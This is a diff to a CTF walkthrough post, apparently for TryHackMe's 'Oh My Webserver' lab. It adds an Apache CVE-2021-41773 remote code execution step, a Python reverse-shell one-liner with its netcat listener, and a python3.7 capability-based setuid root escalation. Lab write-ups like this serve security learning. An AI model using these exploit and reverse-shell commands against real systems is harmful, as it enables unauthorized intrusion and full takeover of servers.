@@ -2,7 +2,7 @@
 title: Oh My Webserver
 date: 2023-03-02 02:47:00 -0500
 categories: [Walkthrough, Tryhackme, CTF]
-tags: [web, apache, CVE-2021-41773]
+tags: [web, apache, CVE-2021-41773, linux, RCE, getcap]
 published: true
 ---
 
@@ -48,5 +48,41 @@ File Type: ASCII text
 Copied to: /home/oskar/Downloads/50383.sh
 ```
 
-### CVE-2021-41773
+### CVE-2021-41773 RCE
 
+- `https://github.com/thehackersbrain/CVE-2021-41773`
+
+```shell
+python3 exploit.py -t ohmywebserver.thm 
+--------------------------------------------------------
+|                Apache2 2.4.49 - Exploit              |
+--------------------------------------------------------
+>>> whoami
+daemon
+```
+
+can try to get a reverse shell
+
+```shell
+export RHOST="10.2.3.64";export RPORT=6999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+```
+
+```shell
+nc -lvnp 6999
+```
+
+## User Privilege Escalation
+
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+
+Running `getcap -r / 2>/dev/null` shows that python3.7 has its capsetuid+ep
+
+```shell
+python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+And we have a root shell we can check /root/user.txt for the user flag.
+
+## Root Privilege Escalation
+
+have to come back to this later :(
